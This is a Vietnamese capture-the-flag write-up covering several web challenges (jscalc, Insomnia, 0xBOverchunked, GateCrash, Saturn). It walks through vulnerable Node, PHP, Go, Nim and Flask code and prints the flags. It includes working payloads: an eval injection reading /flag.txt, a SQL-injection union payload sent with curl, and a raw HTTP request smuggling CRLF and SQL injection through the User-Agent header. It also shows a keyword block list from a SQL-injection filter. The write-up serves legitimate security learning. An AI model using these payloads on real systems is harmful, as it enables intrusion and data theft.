+<p><img src="https://hackmd.io/_uploads/B1qkq7lUA.png" alt="image"></p>
+<p>flag : <code>HTB{wh3n_lif3_g1v3s_y0u_p6_st4rT_p0llut1ng_w1th_styl3!!}</code></p>
+<h1 id="easy">easy</h1>
+<h2 id="jscalc">jscalc</h2>
+<p><img src="https://hackmd.io/_uploads/ByYoi7x8R.png" alt="image"></p>
+<ul>
+<li>Một chall nodejs:</li>
+</ul>
+<pre><code>const express       = require('express');
+const app           = express();
+const bodyParser    = require('body-parser');
+const routes        = require('./routes');
+const path          = require('path');
+
+app.use(bodyParser.json());
+
+app.set('views', './views');
+app.use('/static', express.static(path.resolve('static')));
+
+app.use(routes);
+
+app.all('*', (req, res) =&gt; {
+    return res.status(404).send({
+        message: '404 page not found'
+    });
+});
+
+app.listen(1337, () =&gt; console.log('Listening on port 1337'));
+</code></pre><ul>
+<li>Có một route chính như sau:</li>
+</ul>
+<pre><code>const path       = require('path');
+const express    = require('express');
+const router     = express.Router();
+const Calculator = require('../helpers/calculatorHelper');
+
+const response = data =&gt; ({ message: data });
+
+router.get('/', (req, res) =&gt; {
+	return res.sendFile(path.resolve('views/index.html'));
+});
+
+router.post('/api/calculate', (req, res) =&gt; {
+	let { formula } = req.body;
+
+	if (formula) {
+		result = Calculator.calculate(formula);
+		return res.send(response(result));
+	}
+
+	return res.send(response('Missing parameters'));
+})
+
+module.exports = router;
+
+// ocd
+</code></pre><ul>
+<li>api/calculate sẽ nhận <code>formula</code> sau đó gọi phương thức <code>Calculator.calculate(formula);</code> và trả ra kết quả phép tính:</li>
+</ul>
+<pre><code>module.exports = {
+    calculate(formula) {
+        try {
+            return eval(`(function() { return ${ formula } ;}())`);
+
+        } catch (e) {
+            if (e instanceof SyntaxError) {
+                return 'Something went wrong!';
+            }
+        }
+    }
+}
+
+
+// ocd
+</code></pre><ul>
+<li>
+<p>Có thể thấy chính xác ở đây dùng eval để thực hiện phép tính -&gt; lợi dụng để RCE.</p>
+</li>
+<li>
+<p>Flag nằm ở root cho nên ta cần phải RCE:</p>
+</li>
+</ul>
+<pre><code>FROM node:alpine
+
+# Install packages
+RUN apk add --update --no-cache supervisor g++ make python3
+
+# Setup app
+RUN mkdir -p /app
+
+# Add application
+WORKDIR /app
+COPY challenge .
+
+# Add flag
+COPY flag.txt /
+
+# Install dependencies
+RUN npm install
+
+# Setup superivsord
+COPY config/supervisord.conf /etc/supervisord.conf
+
+# Expose the port node-js is reachable on
+EXPOSE 1337
+
+# Start the node-js application
+CMD [&quot;/usr/bin/supervisord&quot;, &quot;-c&quot;, &quot;/etc/supervisord.conf&quot;]
+</code></pre><ul>
+<li>ở đây mình sẽ sử dụng fs để đọc:</li>
+</ul>
+<p><code>require('fs').readFileSync('/flag.txt', 'utf8')</code></p>
+<p><img src="https://hackmd.io/_uploads/HkJ237lUC.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/ByrahXgUR.png" alt="image"></p>
+<p>flag : <code>HTB{c4lcul4t3d_my_w4y_thr0ugh_rc3}</code></p>
+<h2 id="insomnia">Insomnia</h2>
+<ul>
+<li>Một chall sử dụng source php khá là phức tạp:</li>
+</ul>
+<p><img src="https://hackmd.io/_uploads/BJ0mO4gLC.png" alt="image"></p>
+<ul>
+<li>Chương trình có chức năng đăng kí đăng nhập sau đó được chuyển đến profile của người dùng.</li>
+</ul>
+<pre><code>&lt;?php
+
+namespace App\Controllers;
+
+use App\Controllers\BaseController;
+use CodeIgniter\HTTP\ResponseInterface;
+use Config\Paths;
+use Firebase\JWT\JWT;
+use Firebase\JWT\Key;
+
+class ProfileController extends BaseController
+{
+    public function index()
+    {
+        $token = (string) $_COOKIE[&quot;token&quot;] ?? null;
+        $flag = file_get_contents(APPPATH . &quot;/../flag.txt&quot;);
+        if (isset($token)) {
+            $key = (string) getenv(&quot;JWT_SECRET&quot;);
+            $jwt_decode = JWT::decode($token, new Key($key, &quot;HS256&quot;));
+            $username = $jwt_decode-&gt;username;
+            if ($username == &quot;administrator&quot;) {
+                return view(&quot;ProfilePage&quot;, [
+                    &quot;username&quot; =&gt; $username,
+                    &quot;content&quot; =&gt; $flag,
+                ]);
+            } else {
+                $content = &quot;Haven't seen you for a while&quot;;
+                return view(&quot;ProfilePage&quot;, [
+                    &quot;username&quot; =&gt; $username,
+                    &quot;content&quot; =&gt; $content,
+                ]);
+            }
+        }
+    }
+}
+
+</code></pre><ul>
+<li>
+<p>Đây là nơi hiển thị thông tin của người dùng đó là trang profile mà ta nhắc đến ở trên nếu mà người dùng có username là <code>administrator</code> thì sẽ trả ra flag còn nếu mà không phải thì chỉ trả ra <code>Haven't seen you for a while</code> -&gt; ta cần leo quyền lên admin để đạt được mục đích.</p>
+</li>
+<li>
+<p>Như ta có thể thấy thì ở đây đó chính là phần userController cũng chính là logic mà chúng ta sử dụng để đăng nhập / đăng kí.</p>
+</li>
+</ul>
+<pre><code>&lt;?php
+
+namespace App\Controllers;
+
+use CodeIgniter\Controller;
+use CodeIgniter\API\ResponseTrait;
+use Firebase\JWT\JWT;
+use Firebase\JWT\Key;
+
+class UserController extends Controller
+{
+    use ResponseTrait;
+
+    public function LoginIndex()
+    {
+        return View(&quot;LoginPage&quot;);
+    }
+    public function login()
+    {
+        $db = db_connect();
+        $json_data = request()-&gt;getJSON(true);
+        if (!count($json_data) == 2) {
+            return $this-&gt;respond(&quot;Please provide username and password&quot;, 404);
+        }
+        $query = $db-&gt;table(&quot;users&quot;)-&gt;getWhere($json_data, 1, 0);
+        $result = $query-&gt;getRowArray();
+        if (!$result) {
+            return $this-&gt;respond(&quot;User not found&quot;, 404);
+        } else {
+            $key = (string) getenv(&quot;JWT_SECRET&quot;);
+            $iat = time();
+            $exp = $iat + 36000;
+            $headers = [
+                &quot;alg&quot; =&gt; &quot;HS256&quot;,
+                &quot;typ&quot; =&gt; &quot;JWT&quot;,
+            ];
+            $payload = [
+                &quot;iat&quot; =&gt; $iat,
+                &quot;exp&quot; =&gt; $exp,
+                &quot;username&quot; =&gt; $result[&quot;username&quot;],
+            ];
+            $token = JWT::encode($payload, $key, &quot;HS256&quot;);
+
+            $response = [
+                &quot;message&quot; =&gt; &quot;Login Succesful&quot;,
+                &quot;token&quot; =&gt; $token,
+            ];
+            return $this-&gt;respond($response, 200);
+        }
+    }
+
+    public function RegisterIndex()
+    {
+        return View(&quot;RegisterPage&quot;);
+    }
+    public function register()
+    {
+        $db = db_connect();
+        $json_data = request()-&gt;getJSON(true);
+        $username = $json_data[&quot;username&quot;] ?? null;
+        $password = $json_data[&quot;password&quot;] ?? null;
+
+        if (!($username &amp;&amp; $password)) {
+            return $this-&gt;respond(&quot;Empty username or password&quot;, 404);
+        } else {
+            // Check if the username already exists
+            $existingUser = $db
+                -&gt;table(&quot;users&quot;)
+                -&gt;where(&quot;username&quot;, $username)
+                -&gt;get()
+                -&gt;getRow();
+
+            if ($existingUser) {
+                return $this-&gt;respond(&quot;Username already exists&quot;, 400);
+            }
+
+            // Insert the new user if the username is unique
+            $db-&gt;table(&quot;users&quot;)-&gt;insert([
+                &quot;username&quot; =&gt; $username,
+                &quot;password&quot; =&gt; $password,
+            ]);
+
+            if ($db-&gt;affectedRows() &gt; 0) {
+                return $this-&gt;respond(
+                    &quot;Registration successful for user: &quot; . $username,
+                    200
+                );
+            } else {
+                return $this-&gt;respond(&quot;Registration failed&quot;, 404);
+            }
+        }
+    }
+}
+
+</code></pre><ul>
+<li>Đầu tiên mình sẽ nói về chức năng đăng kí trước:</li>
+<li>Sau khi connect database thì server sẽ nhận 2 parameter từ client dưới dạng json đó là username và password -&gt; thực hiện check tên username có trong db hay chưa nếu có thì trả ra content là người dùng đã tồn tại -&gt; nếu chưa có thì thực hiện insert dữ liệu vào db :</li>
+</ul>
+<pre><code>$db-&gt;table(&quot;users&quot;)-&gt;insert([
+                &quot;username&quot; =&gt; $username,
+                &quot;password&quot; =&gt; $password,
+            ]);
+</code></pre><ul>
+<li>Đến với chức năng đăng nhập của người dùng -&gt; tương tự server cũng sẽ nhận dữ liệu dưới dạng json từ người dùng sau đó thực hiện check trong db nhưn bug ở đây là người dùng không check password của user:</li>
+</ul>
+<pre><code>$query = $db-&gt;table(&quot;users&quot;)-&gt;getWhere($json_data, 1, 0);
+        $result = $query-&gt;getRowArray();
+</code></pre><ul>
+<li>Mà chỉ thực hiện check username nếu mà có thì sẽ thực hiện tạo token cho user đó.</li>
+</ul>
+<h3 id="access-control-vulnerability">Access control vulnerability</h3>
+<ul>
+<li>Thực hiện leo quyền lên admin :</li>
+</ul>
+<p><img src="https://hackmd.io/_uploads/BJgbaVxI0.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/rJ8kp4lUC.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/ryYkaVgI0.png" alt="image"></p>
+<p>flag : <code>HTB{I_just_want_to_sleep_a_little_bit!!!!!}</code></p>
+<h2 id="0xboverchunked">0xBOverchunked</h2>
+<ul>
+<li>tiếp tục một chall với php source:</li>
+</ul>
+<pre><code>PS D:\ctf_chall\HTBAgain\0xBOverchunked&gt; tree
+D:.
+├───challenge
+│   ├───assets
+│   │   ├───images
+│   │   │   └───posts
+│   │   └───styles
+│   ├───Controllers
+│   │   ├───Database
+│   │   ├───Handlers
+│   │   └───WAF
+│   └───db
+└───conf
+PS D:\ctf_chall\HTBAgain\0xBOverchunked&gt;
+
+</code></pre><ul>
+<li>
+<p>Có thể thấy chương trình viết theo mô hình MVC cơ bản -&gt; đi sâu vào từng file của chương trình.</p>
+</li>
+<li>
+<p>Chương trình sử dụng sqlite db + PDO đề connect db.</p>
+</li>
+<li>
+<p>ở đây chúng ta đã có 2 method để truy vấn vào trong csdl:</p>
+</li>
+</ul>
+<pre><code>&lt;?php
+require_once 'Connect.php';
+
+function safequery($pdo, $id)
+{
+    if ($id == 6)
+    {
+        die(&quot;You are not allowed to view this post!&quot;);
+    }
+
+    $stmt = $pdo-&gt;prepare(&quot;SELECT id, gamename, gamedesc, image FROM posts  WHERE id = ?&quot;);
+    $stmt-&gt;execute([$id]);
+
+    $result = $stmt-&gt;fetch(PDO::FETCH_ASSOC);
+
+    return $result;
+}
+
+function unsafequery($pdo, $id)
+{
+    try
+    {
+        $stmt = $pdo-&gt;query(&quot;SELECT id, gamename, gamedesc, image FROM posts WHERE id = '$id'&quot;);
+        $result = $stmt-&gt;fetch(PDO::FETCH_ASSOC);
+        return $result;
+    }
+    catch(Exception $e)
+    {
+        http_response_code(500);
+        echo &quot;Internal Server Error&quot;;
+        exit();
+    }
+}
+
+?&gt;
+
+</code></pre><ul>
+<li>Khi build server thì init.sql chứa flag:</li>
+</ul>
+<pre><code>CREATE TABLE posts (
+  id INTEGER PRIMARY KEY,
+  gamename TEXT NOT NULL,
+  gamedesc TEXT NOT NULL,
+  image BLOB NOT NULL
+);
+
+INSERT INTO posts (gamename, gamedesc, image)
+VALUES
+  ('Pikachu', 'A small, yellow, mouse-like creature with a lightning bolt-shaped tail. Pikachu is one of the most popular and recognizable characters from the Pokemon franchise.', '1.png'),
+  ('Pac-Man', 'Pac-Man is a classic arcade game where you control a yellow character and navigate through a maze, eating dots and avoiding ghosts.', '2.png'),
+  ('Sonic', 'He is a blue anthropomorphic hedgehog who is known for his incredible speed and his ability to run faster than the speed of sound.', '3.png'),
+  ('Super Mario', 'Its me, Mario, an Italian plumber who must save Princess Toadstool from the evil Bowser.', '4.png'),
+  ('Donkey Kong', 'Donkey Kong is known for his incredible strength, agility, and his ability to swing from vines and barrels.', '5.png'),
+  ('Flag', 'HTB{f4k3_fl4_f0r_t35t1ng}', '6.png');
+
+</code></pre><ul>
+<li>
+<p>có một bảng post sau đó có các bản ghi như trên được insert vào bảng -&gt; hướng đến sqli để lấy flag.</p>
+</li>
+<li>
+<p>Đây là source chính của chương trình hiển thị lúc khởi đầu:</p>
+</li>
+</ul>
+<pre><code>
+&lt;?php
+require_once '../Database/Cursor.php';
+require_once '../WAF/waf.php';
+
+if (isset($_SERVER[&quot;HTTP_TRANSFER_ENCODING&quot;]) &amp;&amp; $_SERVER[&quot;HTTP_TRANSFER_ENCODING&quot;] == &quot;chunked&quot;)
+{
+    $search = $_POST['search'];
+
+    $result = unsafequery($pdo, $search);
+
+    if ($result)
+    {
+        echo &quot;&lt;div class='results'&gt;No post id found.&lt;/div&gt;&quot;;
+    }
+    else
+    {
+        http_response_code(500);
+        echo &quot;Internal Server Error&quot;;
+        exit();
+    }
+
+}
+else
+{
+    if ((isset($_POST[&quot;search&quot;])))
+    {
+        $search = $_POST[&quot;search&quot;];
+        if (waf_sql_injection($search))
+        {
+            $result = safequery($pdo, $search);
+            if ($result)
+            {
+                echo '
+                    &lt;div class=&quot;grid-container&quot;&gt;
+                    &lt;div class=&quot;grid-item&quot;&gt;
+                        &lt;img class=&quot;post-logo&quot; src=&quot;../../assets/images/posts/' . $result[&quot;image&quot;] . '&quot; width=&quot;100&quot;&gt;
+                    &lt;/div&gt;
+                    &lt;div class=&quot;grid-item&quot;&gt;
+                        &lt;p&gt;&lt;font color=&quot;#F44336&quot;&gt;Name&lt;/font&gt;: ' . $result[&quot;gamename&quot;] . '&lt;/p&gt;
+                        &lt;p&gt;&lt;font color=&quot;#F44336&quot;&gt;Description&lt;/font&gt;: ' . $result[&quot;gamedesc&quot;] . '&lt;/p&gt;
+                    &lt;/div&gt;
+                    &lt;/div&gt;';
+            }
+            else
+            {
+                echo &quot;&lt;div class='results'&gt;No post id found.&lt;/div&gt;&quot;;
+            }
+        }
+        else
+        {
+            echo &quot;&lt;div class='results'&gt;SQL Injection attempt identified and prevented by WAF!&lt;/div&gt;&quot;;
+        }
+    }
+    else
+    {
+        echo &quot;&lt;div class='results'&gt;Unsupported method!&lt;/div&gt;&quot;;
+        http_response_code(400);
+    }
+
+}
+
+?&gt;
+
+</code></pre><ul>
+<li>Đầu tiên ta có một if để check header nếu mà <code>HTTP_TRANSFER_ENCODING</code> tồn tại và giá trị của nó là <code>chunked</code> sau đó sẽ lấy parameter <code>search</code> từ method POST -&gt; gọi method <code>unsafequery</code> nếu mà có kết quả thì trả ra <code>No post id found</code> nếu không thì 500 status</li>
+<li>Nếu không phải chunked thì sẽ thực hiện :</li>
+</ul>
+<pre><code>else
+{
+    if ((isset($_POST[&quot;search&quot;])))
+    {
+        $search = $_POST[&quot;search&quot;];
+        if (waf_sql_injection($search))
+        {
+            $result = safequery($pdo, $search);
+            if ($result)
+            {
+                echo '
+                    &lt;div class=&quot;grid-container&quot;&gt;
+                    &lt;div class=&quot;grid-item&quot;&gt;
+                        &lt;img class=&quot;post-logo&quot; src=&quot;../../assets/images/posts/' . $result[&quot;image&quot;] . '&quot; width=&quot;100&quot;&gt;
+                    &lt;/div&gt;
+                    &lt;div class=&quot;grid-item&quot;&gt;
+                        &lt;p&gt;&lt;font color=&quot;#F44336&quot;&gt;Name&lt;/font&gt;: ' . $result[&quot;gamename&quot;] . '&lt;/p&gt;
+                        &lt;p&gt;&lt;font color=&quot;#F44336&quot;&gt;Description&lt;/font&gt;: ' . $result[&quot;gamedesc&quot;] . '&lt;/p&gt;
+                    &lt;/div&gt;
+                    &lt;/div&gt;';
+            }
+            else
+            {
+                echo &quot;&lt;div class='results'&gt;No post id found.&lt;/div&gt;&quot;;
+            }
+        }
+        else
+        {
+            echo &quot;&lt;div class='results'&gt;SQL Injection attempt identified and prevented by WAF!&lt;/div&gt;&quot;;
+        }
+    }
+    else
+    {
+        echo &quot;&lt;div class='results'&gt;Unsupported method!&lt;/div&gt;&quot;;
+        http_response_code(400);
+    }
+</code></pre><ul>
+<li>Tương tự như trên thì vẫn lấy param search sau đó trải qua waf <code>waf_sql_injection</code> :</li>
+</ul>
+<pre><code>function waf_sql_injection($input)
+{
+    $sql_keywords = array(
+        'SELECT',
+        'INSERT',
+        'UPDATE',
+        'DELETE',
+        'UNION',
+        'DROP',
+        'TRUNCATE',
+        'ALTER',
+        'CREATE',
+        'FROM',
+        'WHERE',
+        'GROUP BY',
+        'HAVING',
+        'ORDER BY',
+        'LIMIT',
+        'OFFSET',
+        'JOIN',
+        'ON',
+        'SET',
+        'VALUES',
+        'INDEX',
+        'KEY',
+        'PRIMARY',
+        'FOREIGN',
+        'REFERENCES',
+        'TABLE',
+        'VIEW',
+        'AND',
+        'OR',
+        &quot;'&quot;,
+        '&quot;',
+        &quot;')&quot;,
+        '-- -',
+        '#',
+        '--',
+        '-'
+    );
+
+    foreach ($sql_keywords as $keyword)
+    {
+        if (stripos($input, $keyword) !== false)
+        {
+            return false;
+        }
+    }
+    return true;
+}
+</code></pre><ul>
+<li>Hàm này sẽ sử dụng vòng lặp foreach sau đó dùng strpos để so sánh nếu có bất kì kí tự nào nằm trong search của chúng ta thì sẽ trả ra false.</li>
+<li>Như ở trên Cursor chúng ta đã nói thì chỉ có hàm :</li>
+</ul>
+<pre><code>
+function unsafequery($pdo, $id)
+{
+    try
+    {
+        $stmt = $pdo-&gt;query(&quot;SELECT id, gamename, gamedesc, image FROM posts WHERE id = '$id'&quot;);
+        $result = $stmt-&gt;fetch(PDO::FETCH_ASSOC);
+        return $result;
+    }
+    catch(Exception $e)
+    {
+        http_response_code(500);
+        echo &quot;Internal Server Error&quot;;
+        exit();
+    }
+}
+</code></pre><ul>
+<li>Dính sqli và nó được sử dụng khi <code>HTTP_TRANSFER_ENCODING</code> là <code>chunked</code> thì method này sẽ được gọi và bỏ qua waf luôn -&gt; nhưng vấn đề của bài này là blind.</li>
+</ul>
+<p><a href="https://kulv.eu/posts/10">https://kulv.eu/posts/10</a></p>
+<h2 id="blueprint-heist">Blueprint Heist</h2>
+<p>Link: <a href="https://hackmd.io/3qU5TxPlQDKNAac9VyGrLA?view#WebBlueprint-Heist">https://hackmd.io/3qU5TxPlQDKNAac9VyGrLA?view#WebBlueprint-Heist</a></p>
+<h2 id="labyrinth-linguist">Labyrinth Linguist</h2>
+<p>Link: <a href="https://hackmd.io/17yFgOmaQs252Gg5dQwQKg#Labyrinth_linguist4">https://hackmd.io/17yFgOmaQs252Gg5dQwQKg#Labyrinth_linguist4</a></p>
+<h2 id="gatecrash">GateCrash</h2>
+<ul>
+<li>Một chall chạy go server với proxy server chạy bằng nim server + sqlite3 database:</li>
+</ul>
+<h3 id="go-server">Go server</h3>
+<pre><code>func main() {
+	var err error
+	db, err = sql.Open(&quot;sqlite3&quot;, sqlitePath)
+	if err != nil {
+		log.Fatal(err)
+	}
+	defer db.Close()
+
+	seedDatabase()
+
+	r := mux.NewRouter()
+	r.HandleFunc(&quot;/login&quot;, loginHandler).Methods(&quot;POST&quot;)
+
+	http.Handle(&quot;/&quot;, r)
+	fmt.Println(&quot;Server is running on &quot; + strconv.Itoa(webPort))
+	http.ListenAndServe(&quot;:&quot;+strconv.Itoa(webPort), nil)
+}
+
+</code></pre><ul>
+<li>ở đây ta chỉ thấy khi khởi tạo server sẽ khởi tạo sqlite3 sau đó gọi <code>seedDatabase</code> sau đó chúng ta connect được /login với method <code>POST</code> và <code>loginHandler</code> để xử lí logic ở đây.</li>
+</ul>
+<pre><code>func seedDatabase() {
+	createTable := `
+	CREATE TABLE IF NOT EXISTS users (
+		id INTEGER PRIMARY KEY AUTOINCREMENT,
+		username TEXT NOT NULL,
+		password TEXT NOT NULL
+	);
+	`
+
+	_, err := db.Exec(createTable)
+	if err != nil {
+		log.Fatal(err)
+	}
+
+	for i := 0; i &lt; 10; i++ {
+		newUser, _ := randomHex(32)
+		newPass, _ := randomHex(32)
+
+		hashedPassword, err := bcrypt.GenerateFromPassword([]byte(newPass), bcrypt.DefaultCost)
+		if err != nil {
+			fmt.Println(err)
+			return
+		}
+
+		_, err = db.Exec(&quot;INSERT INTO users (username, password) VALUES ('&quot; + newUser + &quot;', '&quot; + string(hashedPassword) + &quot;');&quot;)
+		if err != nil {
+			fmt.Println(err)
+			return
+		}
+	}
+}
+</code></pre><ul>
+<li>
+<p>ở đây nó sẽ tạo một bảng users với các cột là id, username, password -&gt; insert 10 user đầu tiên vào trong bảng users vơi tên username, password được <code>randomHex</code> và password sẽ được <code>bcrypt</code>.</p>
+</li>
+<li>
+<p>api /login sex trả về một :</p>
+</li>
+</ul>
+<pre><code>func loginHandler(w http.ResponseWriter, r *http.Request) {
+	found := false
+	for _, userAgent := range allowedUserAgents {
+		if strings.Contains(r.Header.Get(&quot;User-Agent&quot;), userAgent) {
+			found = true
+			break
+		}
+	}
+
+	if !found {
+		http.Error(w, &quot;Browser not supported&quot;, http.StatusNotAcceptable)
+		return
+	}
+
+	var user User
+	err := json.NewDecoder(r.Body).Decode(&amp;user)
+	if err != nil {
+		http.Error(w, err.Error(), http.StatusBadRequest)
+		return
+	}
+
+	userPassword := user.Password
+
+	row := db.QueryRow(&quot;SELECT * FROM users WHERE username='&quot; + user.Username + &quot;';&quot;)
+	err = row.Scan(&amp;user.ID, &amp;user.Username, &amp;user.Password)
+	if err != nil {
+		http.Error(w, &quot;Invalid username or password&quot;, http.StatusUnauthorized)
+		return
+	}
+
+	err = bcrypt.CompareHashAndPassword([]byte(user.Password), []byte(userPassword))
+	if err != nil {
+		http.Error(w, &quot;Invalid username or password&quot;, http.StatusUnauthorized)
+		return
+	}
+
+	w.WriteHeader(http.StatusOK)
+	fmt.Fprintln(w, &quot;Login successful&quot;)
+}
+
+</code></pre><ul>
+<li>đầu tiên sẽ check xem của header User-Agent hay không nếu mà có thì cho qua -&lt; sau đó sẽ thực hiện một lệnh truy vấn vào trong database:</li>
+</ul>
+<p><code>row := db.QueryRow(&quot;SELECT * FROM users WHERE username='&quot; + user.Username + &quot;';&quot;)</code> -&gt; theo như quan sát thì ta thấy câu truy vấn bị sqli do việc cộng chuỗi và câu lệnh này sẽ kiểm tra là username này đã tồn tại ở trong db hay chưa-&gt; nếu chưa thì thực hiện brcypt mật khẩu và lưu vào trong db -&gt; trả về status 200</p>
+<ul>
+<li>Mục tiêu ở đây là chúng lấy được flag nhưng flag nằm trong nim proxy nên bây giờ chúng ta hãy phân tích</li>
+</ul>
+<h3 id="nim-proxy">Nim proxy</h3>
+<pre><code>import asyncdispatch, strutils, jester, httpClient, json
+import std/uri
+
+const userApi = &quot;http://127.0.0.1:9090&quot;
+
+proc msgjson(msg: string): string =
+  &quot;&quot;&quot;{&quot;msg&quot;: &quot;$#&quot;}&quot;&quot;&quot; % [msg]
+
+proc containsSqlInjection(input: string): bool =
+  for c in input:
+    let ordC = ord(c)
+    if not ((ordC &gt;= ord('a') and ordC &lt;= ord('z')) or
+            (ordC &gt;= ord('A') and ordC &lt;= ord('Z')) or
+            (ordC &gt;= ord('0') and ordC &lt;= ord('9'))):
+      return true
+  return false
+
+settings:
+  port = Port 1337
+
+routes:
+  post &quot;/user&quot;:
+    let username = @&quot;username&quot;
+    let password = @&quot;password&quot;
+
+    if containsSqlInjection(username) or containsSqlInjection(password):
+      resp msgjson(&quot;Malicious input detected&quot;)
+
+    let userAgent = decodeUrl(request.headers[&quot;user-agent&quot;])
+
+    let jsonData = %*{
+      &quot;username&quot;: username,
+      &quot;password&quot;: password
+    }
+
+    let jsonStr = $jsonData
+
+    let client = newHttpClient(userAgent)
+    client.headers = newHttpHeaders({&quot;Content-Type&quot;: &quot;application/json&quot;})
+
+    let response = client.request(userApi &amp; &quot;/login&quot;, httpMethod = HttpPost, body = jsonStr)
+
+    if response.code != Http200:
+      resp msgjson(response.body.strip())
+       
+    resp msgjson(readFile(&quot;/flag.txt&quot;))
+
+runForever()
+
+</code></pre><ul>
+<li>Có thể thấy nó chạy ở port 1337 và sẽ chuyển tiếp các yêu cầu đến port 9090 -&gt; để ý ở đây chỉ có một route /user:</li>
+</ul>
+<pre><code>routes:
+  post &quot;/user&quot;:
+    let username = @&quot;username&quot;
+    let password = @&quot;password&quot;
+
+    if containsSqlInjection(username) or containsSqlInjection(password):
+      resp msgjson(&quot;Malicious input detected&quot;)
+
+    let userAgent = decodeUrl(request.headers[&quot;user-agent&quot;])
+
+    let jsonData = %*{
+      &quot;username&quot;: username,
+      &quot;password&quot;: password
+    }
+
+    let jsonStr = $jsonData
+
+    let client = newHttpClient(userAgent)
+    client.headers = newHttpHeaders({&quot;Content-Type&quot;: &quot;application/json&quot;})
+
+    let response = client.request(userApi &amp; &quot;/login&quot;, httpMethod = HttpPost, body = jsonStr)
+
+    if response.code != Http200:
+      resp msgjson(response.body.strip())
+       
+    resp msgjson(readFile(&quot;/flag.txt&quot;))
+</code></pre><ul>
+<li>nhận username và password của người dùng -&gt; sau đó check qua hàm <code>containsSqlInjection</code> cả 2 tham số này:</li>
+</ul>
+<p><code>proc containsSqlInjection(input: string): bool = for c in input: let ordC = ord(c) if not ((ordC &gt;= ord('a') and ordC &lt;= ord('z')) or (ordC &gt;= ord('A') and ordC &lt;= ord('Z')) or (ordC &gt;= ord('0') and ordC &lt;= ord('9'))): return true return false</code></p>
+<ul>
+<li>Như đã thấy thì chỉ cho phép các kí tự nằm từ a-zA-Z0-9 -&gt; nếu kiểm tra thành công sẽ lấy user-agent từ header + jsonData là username và password đã nói ở trên -&gt; thực hiện gửi đến go server để login nếu mà trả ra 200 -&gt; nhận flag.</li>
+</ul>
+<h3 id="flow-1">Flow</h3>
+<ul>
+<li>Ta sẽ dùng crlf để bypass việc gửi username và pasword của người dùng để vượt qua waf</li>
+</ul>
+<p><img src="https://hackmd.io/_uploads/HyWdhkd8R.png" alt="image"></p>
+<ul>
+<li>Nếu build docker thì có thể dùng lệnh : <code>curl &quot;http://localhost:9090/login&quot; -X POST   --data-binary $'{\&quot;username\&quot;:\&quot;asas\' union select 1 as id , \'hacker\' as username , \'$2a$10$N2/NBEeXbAL5XqK6l.ZLAuJkZgRcWE9SLcXJlQ.paq/5c0bTqoFne\' as password  -- \&quot;, \&quot;password\&quot;:\&quot;password123\&quot;}' -H &quot;User-Agent: Mozilla/7.0&quot; -H &quot;Content-Type: application/json&quot;</code> để kiểm tra xem sqli của bạn có hoạt động hay không</li>
+</ul>
+<h3 id="khai-thác">Khai thác</h3>
+<p><img src="https://hackmd.io/_uploads/HklvTkO8A.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/SyY9Ak_U0.png" alt="image"></p>
+<pre><code>POST /user HTTP/1.1
+Host: 94.237.54.176:38751
+User-Agent: Mozilla/7.0%0d%0a%0d%0a%7b%22username%22%3a%22asas'%20union%20select%201%20as%20id%2c%20'hacker'%20as%20username%2c%20'%242a%2410%24N2%2fNBEeXbAL5XqK6l.ZLAuJkZgRcWE9SLcXJlQ.paq%2f5c0bTqoFne'%20as%20password%20%20--%20%22%2c%22password%22%3a%22password123%22%7d
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://94.237.54.176:38751/
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 173
+Origin: http://94.237.54.176:38751
+Connection: close
+Priority: u=1
+
+username=hehaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaae&amp;password=huhuaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+</code></pre><p>flag : <code>HTB{do_the_d45h_0n_d4_p4r53r!}</code></p>
+<h2 id="saturn">Saturn</h2>
+<ul>
+<li>Một chall với python flask:</li>
+</ul>
+<pre><code>from flask import Flask, request, render_template
+import requests
+from safeurl import safeurl
+
+app = Flask(__name__)
+
+@app.route('/', methods=['GET', 'POST'])
+def index():
+    if request.method == 'POST':
+        url = request.form['url']
+        try:
+            su = safeurl.SafeURL()
+            opt = safeurl.Options()
+            opt.enableFollowLocation().setFollowLocationLimit(0)
+            su.setOptions(opt)
+            su.execute(url)
+        except:
+            return render_template('index.html', error=f&quot;Malicious input detected.&quot;)
+        r = requests.get(url)
+        return render_template('index.html', result=r.text)
+    return render_template('index.html')
+
+
+@app.route('/secret')
+def secret():
+    if request.remote_addr == '127.0.0.1':
+        flag = &quot;&quot;
+        with open('./flag.txt') as f:
+            flag = f.readline()
+        return render_template('secret.html', SECRET=flag)
+    else:
+        return render_template('forbidden.html'), 403
+
+
+if __name__ == '__main__':
+    app.run(host=&quot;0.0.0.0&quot;, port=1337, threaded=True)
+
+</code></pre><ul>
+<li>Có thể thấy là server có 2 route chính :</li>
+</ul>
+<pre><code>@app.route('/', methods=['GET', 'POST'])
+def index():
+    if request.method == 'POST':
+        url = request.form['url']
+        try:
+            su = safeurl.SafeURL()
+            opt = safeurl.Options()
+            opt.enableFollowLocation().setFollowLocationLimit(0)
+            su.setOptions(opt)
+            su.execute(url)
+        except:
+            return render_template('index.html', error=f&quot;Malicious input detected.&quot;)
+        r = requests.get(url)
+        return render_template('index.html', result=r.text)
+    return render_template('index.html')
+
+</code></pre><ul>
+<li>Route / sẽ nhận 2 method ở đây ta sẽ quan tâm đến POST server nhận url do ta cung cấp sau đó check url qua module: <code>safeurl</code></li>
+<li>Nếu thành công thì sẽ thực hiện gửi request đến url của mình gửi, còn nếu mà không thành công thì sẽ hiển thị lỗi, và khi thành công sẽ trả ra kết quả.</li>
+<li>Route /secret:</li>
+</ul>
+<pre><code>@app.route('/secret')
+def secret():
+    if request.remote_addr == '127.0.0.1':
+        flag = &quot;&quot;
+        with open('./flag.txt') as f:
+            flag = f.readline()
+        return render_template('secret.html', SECRET=flag)
+    else:
+        return render_template('forbidden.html'), 403
+</code></pre><ul>
+<li>Chỉ chấp nhận localhost và trả ra flag cho mình -&gt; bài này đơn giản là SSRF để lấy flag qua localhost.</li>
+<li>Vấn đề ở đây là bypass được <code>safeurl</code> để gửi đến localhost.</li>
+</ul>
